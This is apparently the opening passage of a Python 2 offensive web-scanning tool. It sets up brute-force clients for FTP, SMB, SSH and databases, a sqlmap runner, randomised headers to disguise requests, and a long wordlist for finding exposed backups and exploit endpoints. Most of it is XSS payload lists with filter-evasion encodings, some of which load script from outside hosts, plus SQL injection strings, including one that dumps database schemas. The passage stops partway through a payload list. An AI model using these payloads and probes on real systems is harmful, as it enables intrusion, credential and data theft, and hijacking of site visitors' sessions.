# coding:utf-8
import requests
import multiprocessing
import subprocess
requests.packages.urllib3.disable_warnings()
from string import whitespace
import urllib
import urlparse
import mechanize
from bs4 import BeautifulSoup
import pymysql
import pymssql
import psycopg2
import cx_Oracle
import telnetlib
import paramiko
import httplib
import random
import pymongo
import requests
paramiko.util.logging.getLogger('paramiko.transport').addHandler(paramiko.util.logging.NullHandler())
from ftplib import FTP
from smb.SMBConnection import SMBConnection
import re
import os
import time
from bs4 import BeautifulSoup as bs
import chardet
import hashlib
import masscan

import os
from tinydb import TinyDB, where
from tinydb.storages import JSONStorage
from tinydb.middlewares import CachingMiddleware
from collections import namedtuple

Port = namedtuple("Port", ["name", "port", "protocol", "description"])

__BASE_PATH__ = os.path.dirname(os.path.abspath(__file__))
__DATABASE_PATH__ = os.path.join(__BASE_PATH__, 'ports.json')
__DB__ = TinyDB(__DATABASE_PATH__, storage=CachingMiddleware(JSONStorage))


import base64
import socket
import urllib2

timeout = 5
socket.setdefaulttimeout(timeout)

import sys

reload(sys)
sys.setdefaultencoding('utf-8')


def get_ports(port, like=False):
    """
    This function creates the SQL query depending on the specified port and
    the --like option.

    :param port: the specified port
    :param like: the --like option
    :return: all ports matching the given ``port``
    :rtype: list
    """
    where_field = "port" if port.isdigit() else "name"
    if like:
        ports = __DB__.search(where(where_field).search(port))
    else:
        ports = __DB__.search(where(where_field) == port)

    return ports[0] # flake8: noqa (F812)

# 扫描备份文件
dir_list = ['www', 'data', 'backup']
backup_name_A = ['.rar', '.zip', '.tar', '.tar.bz2', '.sql', '.7z', '.bak', '.txt', '.tar.gz', '.iso', '.gz']
backup_name_C = ['/user.txt', '/uploads.tar', '/config.7z', '/html.tar.bz2', '/deploy.tar.gz', '/db.tar', '/data.zip',
                 '/backup.sql', '/hdocs.tar', '/123.gz', '/backup.tgz', '/root.rar', '/wz.zip', '/www.tar', '/3.tar',
                 '/users.txt', '/bak.rar', '/vip.tar.gz', '/123.tar', '/2015.rar', '/upload.tar', '/back.rar',
                 '/date.zip', '/date.tar', '/web.gz', '/old.tar.bz2', '/bak/wwwroot.rar', '/package.zip', '/htdocs.gz',
                 '/uploads.tar.bz2', '/admin.tar', '/temp.zip', '/123.zip', '/3.rar', '/data.tar', '/old.rar',
                 '/wwwroot.zip', '/beifen.7z', '/config/db.jsp.bak', '/2017.rar', '/2018.zip', '/tools.tar.gz',
                 '/bak/htdocs.tar.gz', '/1.tar', '/upfile.zip', '/2015.bz2', '/admin/admin.tar.gz', '/test.sql',
                 '/database.tar.gz', '/2015.7z', '/website.gz', '/hdocs.zip', '/dump.sql.gz', '/config/config.jsp.bak',
                 '/Release.zip', '/beifen.tar.gz', '/databackup/dvbbs7.mdb', '/123.tar.gz', '/ftp.zip', '/a.tar',
                 '/build.tar.gz', '/ftp.7z', '/wangzhan.rar', '/userlist.tar', '/web.tar.gz', '/website.tgz',
                 '/ftp.tar.gz', '/2014.tar', '/bbs.zip', '/2018.tar', '/tmp.tar.gz', '/backup.sql.gz', '/a.zip',
                 '/beian.rar', '/database.7z', '/ftp.rar', '/index.bak', '/bak.tar.gz', '/2017.tar', '/uploads.tar.gz',
                 '/template.tar', '/webroot.zip', '/test.zip', '/index.tar.tz', '/web.tgz', '/oa.tar.gz',
                 '/site.tar.gz', '/2014.gz', '/wwwroot.tar.bz2', '/upload.zip', '/flashfxp.tar', '/bak.zip',
                 '/upload.tgz', '/bak/wwwroot.zip', '/website.tar.bz2', '/back.tar.gz', '/error_log', '/htdocs.bz2',
                 '/2017.7z', '/code.tar.gz', '/template.zip', '/htdocs.tar.gz', '/test.tar', '/upload.tar.gz',
                 '/upfile.tar', '/oa.tar', '/2014.bz2', '/web.bz2', '/back.tar.bz2', '/2016.bz2', '/date.rar',
                 '/2.tar.gz', '/tmp.zip', '/tmp.tgz', '/flashfxp.tar.gz', '/admin/admin.rar', '/HYTop.mdb', '/old.zip',
                 '/oa.7z', '/index.rar', '/backup.gz', '/html.zip', '/database.tgz', '/uploads.zip', '/2018.gz',
                 '/html.gz', '/bbs.tar', '/2016.tar.bz2', '/update.rar', '/database/PowerEasy2006.mdb', '/db.zip',
                 '/temp.tar.bz2', '/admin.7z', '/err_log.db', '/2017.zip', '/Release.rar', '/old.7z',
                 '/www.root.zip', '/www.root.tar.gz', '/upload.7z', '/www.tgz', '/temp.7z', '/wz.rar', '/2.rar',
                 '/website.7z', '/sql.tgz', '/inc/config.php.bak', '/config.rar', '/config/config_ucenter.php.bak',
                 '/data.tgz', '/2.0.3.0.sql', '/src.tar.gz', '/www.tar.gz', '/test.tar.gz', '/2.7z', '/db.rar',
                 '/bbs.rar', '/123.bz2', '/template.7z', '/temp.tar.gz', '/userlist.txt', '/beifen.zip',
                 '/wangzhan.tar', '/temp.tgz', '/webserver.tar.gz', '/sql.7z', '/admin.tgz', '/package.rar', '/www.rar',
                 '/wangzhan.zip', '/htdocs.rar', '/bak/2012-12-25.rar', '/wwwroot.tar', '/www.7z', '/bak.tar',
                 '/123.rar', '/beian.tar', '/upload.rar', '/inc/conn.asp.bak', '/www.zip', '/db.7z', '/database.sql.gz',
                 '/users.rar', '/html.tar.gz', '/database.sql', '/uploads.7z', '/htdocs.7z', '/sql.zip',
                 '/data.tar.bz2', '/www.root.7z', '/admin.rar', '/x.tar.gz', '/index.7z', '/database.zip',
                 '/install.tar.gz', '/old.tar.gz', '/www.bz2', '/wwroot.rar', '/admin.sql', '/123.7z', '/hdocs.tar.gz',
                 '/www.root.tar', '/backup.rar', '/back.zip', '/2016.tar', '/bak/2012-12-25.tar.gz', '/a.rar',
                 '/beian.7z', '/inc/db.php.bak', '/1.gz', '/1.rar', '/wwwroot.tar.gz', '/admin.txt', '/website.bz2',
                 '/bbs.7z', '/website.tar', '/include/conn.asp.bak', '/admin.tar.gz', '/tmp.rar', '/users.sql',
                 '/config/config_global.php.bak', '/config.tar.gz', '/backup.bz2', '/2016.zip', '/2016.gz',
                 '/Release.7z', '/2018.tar.bz2', '/package.tar.bz2', '/gg.rar', '/2015.tar.gz', '/wwwroot.7z',
                 '/tmp.tar.bz2', '/update.gz', '/beian.zip', '/2017.tar.bz2', '/2015.tar.bz2', '/back.7z', '/web.7z',
                 '/2.7z.tar.g', '/2014.7z', '/root.tar.gz', '/ewebeditor/db/ewebeditor.mdb', '/2.zip', '/ftp.tar',
                 '/conn.php.bak', '/admin.tar.bz2', '/bak.7z', '/backup.tar', '/www.root.rar', '/oa.zip', '/test.tgz',
                 '/proxy.pac', '/upload.tar.bz2', '/fdsa.rar', '/beifen.rar', '/conf/conf.zip', '/db.sql',
                 '/template.rar', '/output.tar.gz', '/ftp.tar.bz2', '/config.zip', '/index.tar.gz', '/bak.sql',
                 '/include/conn.php.bak', '/a.7z', '/bak/htdocs.rar', '/back.tar',
                 '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', '/invoker/readonly', '/sql.tar.bz2',
                 '/2014.rar', '/users.zip', '/database.tar.bz2', '/uploads.rar', '/bbs.tar.gz',
                 '/include/config.inc.php.bak', '/2014.tar.bz2', '/database.rar', '/bak/htdocs.zip', '/update.bz2',
                 '/upload.bz2', '/web.tar', '/website.tar.gz', '/ftp.txt', '/wz.tar.gz',
                 '/1.7z.tar.gz', '/flashfxp.zip', '/a.tar.gz', '/wls-wsat/CoordinatorPortType', '/upload.gz',
                 '/dump.sql', '/Release.tar.gz', '/beifen.tar', '/data.rar', '/db.sqlite', '/update.tar.bz2',
                 '/uploads.bz2', '/html.rar', '/test.tar.bz2', '/db.tgz', '/2015.gz', '/hdocs.7z', '/Release.tar',
                 '/package.tgz', '/2015.zip', '/2016.tar.gz', '/test.7z', '/include/db.php.bak', '/date.tar.gz',
                 '/db.sql.tar', '/html.bz2', '/2.tar', '/website.rar', '/wwwroot.tgz', '/vip.rar', '/2018.tar.gz',
                 '/backup.zip', '/wangzhan.tar.gz', '/db.sql.gz', '/dev.tar', '/db.tar.gz', '/2018.7z', '/web.rar',
                 '/upfile.tar.gz', '/error.log', '/2017.tar.gz', '/wwwroot.rar', '/www.gz', '/1.tar.gz', '/admin.zip',
                 '/2016.7z', '/vip.7z', '/flashfxp.7z', '/o.tar.gz', '/root.zip',
                 '/bak/2012.tar.gz', '/conf.tar.gz', '/sql.rar', '/wz.7z', '/backup.7z', '/config/db.php.bak',
                 '/2018.rar', '/2.gz', '/root.tar', '/server.cfg', '/2018.bz2', '/htdocs.zip', '/index.tar.bz2',
                 '/2017.bz2', '/vip.tar', '/wwwroot.bz2', '/db.tar.bz2', '/data.sql.gz', '/uploads.gz',
                 '/update.tar.gz', '/2016.rar', '/config/config.php.bak', '/inc/conn.php.bak', '/update.tar',
                 '/backup.tar.bz2', '/bak/wwwroot.tar.gz', '/sql.tar', '/wz.tar', '/db.sql.tar.gz',
                 '/editor/db/ewebeditor.mdb', '/flashfxp.rar', '/www.tar.bz2', '/package.tar.gz', '/ftp.tgz',
                 '/temp.rar', '/2017.gz', '/bak/2012.rar', '/sql.tar.gz', '/test.rar', '/update.zip',
                 '/config.inc.php.bak', '/2015.tar', '/old.tgz', '/3.zip', '/wwwroot.gz', '/upfile.rar', '/oa.rar',
                 '/update.7z', '/2014.tar.gz', '/root.7z', '/3.7z', '/data.tar.gz', '/html.tar', '/users.tar.gz',
                 '/3.tar.gz', '/backup.tar.gz', '/conn.asp.bak', '/website.zip', '/users.tar', '/beian.tar.gz', '/1.7z',
                 '/wangzhan.7z', '/database/PowerEasy5.mdb', '/upfile.7z', '/hdocs.rar', '/data.7z', '/web.zip',
                 '/temp.tar', '/date.7z', '/template.tar.gz', '/htdocs.tar.bz2', '/vip.zip', '/index.zip', '/2014.zip',
                 '/123.tar.bz2', '/web.tar.bz2', '/html.7z', '/1.zip', '/data.sql']

# 扫描注入
os_python = os.path.join(os.getcwd(), 'lib\python.exe')
os_sqlmap = os.path.join(os.getcwd(), 'lib\sqlmap\\')
os_run = os_python + ' ' + os_sqlmap


# 写入日志
def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('-------------------------------------' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + x + '\n')


# 请求头
REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]
# 浏览器头部信息
headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}

# XSS payload

payload_1 = ['</script>"><script>prompt(1)</script>', '</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>',
             '"><img src=x onerror=prompt(1)>', '"><svg/onload=prompt(1)>', '"><iframe/src=javascript:prompt(1)>',
             '"><h1 onclick=prompt(1)>Clickme</h1>', '"><a href=javascript:prompt(1)>Clickme</a>',
             '"><a href="javascript:confirm%28 1%29">Clickme</a>',
             '"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>',
             '"><textarea autofocus onfocus=prompt(1)>',
             '"><a/href=javascript&colon;co\\u006efir\\u006d&#40;&quot;1&quot;&#41;>clickme</a>',
             '"><script>co\\u006efir\\u006d`1`</script>', '"><ScRiPt>co\\u006efir\\u006d`1`</ScRiPt>',
             '"><img src=x onerror=co\\u006efir\\u006d`1`>', '"><svg/onload=co\\u006efir\\u006d`1`>',
             '"><iframe/src=javascript:co\\u006efir\\u006d%28 1%29>',
             '"><h1 onclick=co\\u006efir\\u006d(1)>Clickme</h1>', '"><a href=javascript:prompt%28 1%29>Clickme</a>',
             '"><a href="javascript:co\\u006efir\\u006d%28 1%29">Clickme</a>',
             '"><textarea autofocus onfocus=co\\u006efir\\u006d(1)>',
             '"><details/ontoggle=co\\u006efir\\u006d`1`>clickmeonchrome',
             '"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme', '"><img/src=x%0Aonerror=prompt`1`>',
             '"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">',
             '"><h1/ondrag=co\\u006efir\\u006d`1`)>DragMe</h1>']
payload_2 = ['<script>alert(1)</script>', '<scRipt>alErt(1)</scrIpt>', '<img src=x onerror=alert(1)>',
             '<script type=vbscript>MsgBox(0)</script>', "a'or 2=2--", '<IMG SRC=javascript:alert("XSS")>',
             '<IMG SRC=JaVaScRiPt:alert("XSS")>', '<BODY ONLOAD=alert("XSS")>',
             '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>',
             '<IMG SRC="   javascript:alert("XSS");">', '<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>',
             '<BODY BACKGROUND="javascript:alert("XSS")">', '<IMG DYNSRC="javascript:alert("XSS")">',
             '<INPUT TYPE="image" DYNSRC="javascript:alert("XSS");">', '<BGSOUND SRC="javascript:alert("XSS");">',
             '<br size="&{alert("XSS")}">', '<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>',
             '<LINK REL="stylesheet" HREF="javascript:alert("XSS");">', '<IMG SRC="vbscript:msgbox("XSS")">',
             '<IMG SRC="mocha:[code]">', '<IMG SRC="livescript:[code]">',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert("XSS");">',
             '<IFRAME SRC=javascript:alert("XSS")></IFRAME>',
             '<FRAMESET><FRAME SRC=javascript:alert("XSS")></FRAME></FRAMESET>',
             '<TABLE BACKGROUND="javascript:alert("XSS")">',
             '<DIV STYLE="background-image: url(javascript:alert("XSS"))">',
             '<DIV STYLE="behaviour: url("http://xss.ha.ckers.org/exploit.htc");">',
             '<DIV STYLE="width: expression(alert("XSS"));">',
             '<STYLE>@im\\port"\\ja\\vasc\\ript:alert("XSS")";</STYLE>',
             '<IMG STYLE="xss: expre\\ssion(alert("XSS"))">', '<STYLE TYPE="text/javascript">alert("XSS");</STYLE>',
             '<XML SRC="javascript:alert("XSS");">',
             '"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert("XSS");}</SCRIPT><"',
             '<SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>', '<IMG SRC="javascript:alert("XSS")"',
             '<SCRIPT a=">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>',
             '<SCRIPT =">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>',
             '<SCRIPT a=">" "" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT><SCRIPT "a=">"" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>',
             '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>',
             '<A HREF=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D>link</A>',
             '<A HREF=ht://www.google.com/>link</A>', '<A HREF=http://google.com/>link</A>',
             '<A HREF=http://www.google.com./>link</A>',
             '<A HREF="javascript:document.location="http://www.google.com/"">link</A>',
             '<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>',
             '<BASE HREF="javascript:alert("XSS");//">', '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
             '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">', '<IMG SRC=# onmouseover="alert("xxs")">',
             '<IMG SRC= onmouseover="alert("xxs")">', '<IMG onmouseover="alert("xxs")">',
             '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
             '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
             '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
             '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
             '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
             '<IMG SRC="javascript:alert("XSS");">', '<IMG SRC="jav&#x09;ascript:alert("XSS");">',
             '<IMG SRC="jav&#x0A;ascript:alert("XSS");">', '<IMG SRC="jav&#x0D;ascript:alert("XSS");">',
             '<IMG SRC=" &#14;  javascript:alert("XSS");">', '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
             '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
             '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '<<SCRIPT>alert("XSS");//<</SCRIPT>',
             '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >', '<SCRIPT SRC=//ha.ckers.org/.j>',
             '<IMG SRC="javascript:alert("XSS")"', '<iframe src=http://ha.ckers.org/scriptlet.html <',
             '\\";alert("XSS");//', '</script><script>alert("XSS");</script>', '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
             "<a/onmouseover[\\x0b]=location='\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B'>",
             '<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>', '<marquee/onstart=confirm(2)>',
             '<table background="javascript:alert(1)"></table>', '"/><marquee onfinish=confirm(123)>a</marquee>',
             '<svg/onload=prompt(1);>', '<isindex action="javas&tab;cript:alert(1)" type=image>',
             '<marquee/onstart=confirm(2)>',
             '/*!00000concat*/(0x63726561746f723a2064705f6d6d78,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))',
             '<object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?',
             '0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user',
             '1 AND (select DCount(last(username)&after=1&after=1) from users where username=ad1min)',
             "1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')",
             '%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E',
             '<details ontoggle=alert(1)>', '<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">',
             '<body style="height:1000px" onwheel="[DATA]">',
             '<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">',
             '<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">',
             '<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">',
             '<body style="height:1000px" onwheel="alert(1)">',
             '<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">',
             '<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>',
             '<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>',
             '?<input type="search" onsearch="aler\\u0074(1)">', '<details ontoggle=alert(1)>']
payload_3 = ['</ScrIpt><script>alert(1)</script>', '<scr<script>ipt>alert("XSS")</scr<script>ipt>',
             '<div onclick="alert(\'xss\')">', '<div style="color: expression(alert(\'XSS\'))">',
             '<div style="color: \'<\'; color: expression(alert(\'XSS\'))">', '%c1;alert(/xss/);//',
             '"onclick=alert(1)//', '"><!--   --><script>alert(xss);<script>',
             '<script>alert(navigator.userAgent)<script>', '<script>alert(88199)</script>',
             '<script>confirm(88199)</script>', '<script>prompt(88199)</script>',
             '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(88199)</script>', '<script>+alert(88199)</script>',
             '<script>alert(/88199/)</script>', '<script src=data:text/javascript,alert(88199)></script>',
             '<script src=&#100&#97&#116&#97:text/javascript,alert(88199)></script>',
             '<script>alert(String.fromCharCode(49,49))</script>', '<script>alert(/88199/.source)</script>',
             '<script>setTimeout(alert(88199),0)</script>', "<script>document['write'](88199);</script>",
             '<anytag onmouseover=alert(15)>', '<anytag onclick=alert(16)>', '<a onmouseover=alert(17)>',
             '<a onclick=alert(18)>', '<a href=javascript:alert(19)>', '<button/onclick=alert(20)>', '<form><button',
             'formaction=javascript&colon;alert(21)>', '<form/action=javascript:alert(22)><input/type=submit>',
             '<form onsubmit=alert(23)><button>', '<form onsubmit=alert(23)><button>',
             '<img src=x onerror=alert(24)> 29', '<body/onload=alert(25)><body>',
             'onscroll=alert(26)><br><br><br><br><br><br><br>', '<br><br><br><br><br><br><br><br><br><br><br>',
             '<br><br><br><br><br><br><br><br><br><br><br>', '<br><br><br><br><br><br><br><br><br><br><br>',
             '<input autofocus>', '<iframe src="http://0x.lv/xss.swf"></iframe>',
             '<iframe/onload=alert(document.domain)></iframe>', '<IFRAME SRC="javascript:alert(29);"></IFRAME>',
             '<meta http-equiv="refresh" content="0;',
             'url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E">',
             '<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+></object>',
             '<object data="javascript:alert(document.domain)">', '<marquee onstart=alert(30)></marquee>',
             '<isindex type=image src=1 onerror=alert(31)>', '<isindex action=javascript:alert(32) type=image>',
             '<input onfocus=alert(33) autofocus>', '<input onblur=alert(34) autofocus><input autofocus>',
             '<script>alert(1);</script>', '<script>prompt(1);</script>', '<script>confirm      (1);</script>',
             '<a  href=\xe2\x80\x9chttp://www.google.com">Clickme</a>',
             '<a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>',
             '<a href=\xe2\x80\x9djavascript:alert(1)\xe2\x80\x9d>Clickme</a>',
             '<body/onhashchange=alert(1)><a href=#>clickit', '<img src=x      onerror=prompt(1);>',
             '<img/src=aaa.jpg      onerror=prompt(1);', '<video src=x      onerror=prompt(1);>',
             '<audio src=x      onerror=prompt(1);>', '<iframesrc="javascript:alert(2)">',
             '<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
             '<embed/src=//goo.gl/nlX0P>', '<form action="Javascript:alert(1)"><input type=submit>',
             '<isindex action="javascript:alert(1)" type=image>',
             '<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>',
             '<isindex action=data:text/html, type=image',
             '<span class="pln">    </span><span class="tag">&lt;formaction</span><span class="pun">=</span><span class="atv">&amp;#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&amp;#039;</span><span class="tag">&gt;&lt;button&gt;</span><span class="pln">CLICK</span>',
             '<isindexformaction="javascript:alert(1)"      type=image>',
             '<input type="image" formaction=JaVaScript:alert(0)>',
             '<form><button formaction=javascript&colon;alert(1)>CLICKME',
             '<table background=javascript:alert(1)></table> // Works on Opera 10.5      and IE6',
             '<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5',
             '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">',
             '<object/data=//goo.gl/nlX0P?', '<applet code="javascript:confirm(document.cookie);"> // Firefox Only',
             '<embed  code="http://businessinfo.co.uk/labs/xss/xss.swf"      allowscriptaccess=always>',
             '<svg/onload=prompt(1);>', '<marquee/onstart=confirm(2)>/', '<body onload=prompt(1);>',
             '<select autofocus onfocus=alert(1)>', '<textarea autofocus onfocus=alert(1)>',
             '<keygen autofocus onfocus=alert(1)>', '<video><source onerror="javascript:alert(1)">', '<q/oncut=open()>',
             '<q/oncut=alert(1)>', '<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>',
             '<body  language=vbsonload=alert-1 // Works with IE8',
             '<command onmouseover="\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x6    9\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B">Save</command>',
             '<a onmouseover="javascript:window.onerror=alert;throw 1>',
             '<img src=x onerror="javascript:window.onerror=alert;throw 1">',
             '<body/onload=javascript:window.onerror=eval;throw&#039;=alert\\x281\\x29&#039;;',
             '<img style="xss:expression(alert(0))"> // Works upto IE7.',
             '<div style="color:rgb(&#039;&#039;x:expression(alert(1))"></div>',
             '<style>#test{x:expression(alert(/XSS/))}</style>',
             '<a onmouseover=location=\xe2\x80\x99javascript:alert(1)>click',
             '<body onfocus="location=&#039;javascrpt:alert(1) >123',
             '<meta http-equiv="refresh"      content="0;url=//goo.gl/nlX0P">',
             '<meta http-equiv="refresh"      content="0;javascript&colon;alert(1)"/>',
             '<svg xmlns="http://www.w3.org/2000/svg"><g      onload="javascript:\\u0061lert(1);"></g></svg>',
             '<svg xmlns:xlink=" r=100 /><animate attributeName="xlink:href"      values=";javascript:alert(1)" begin="0s"      dur="0.1s" fill="freeze"/>',
             '<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(2)//"</svg> ',
             '<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
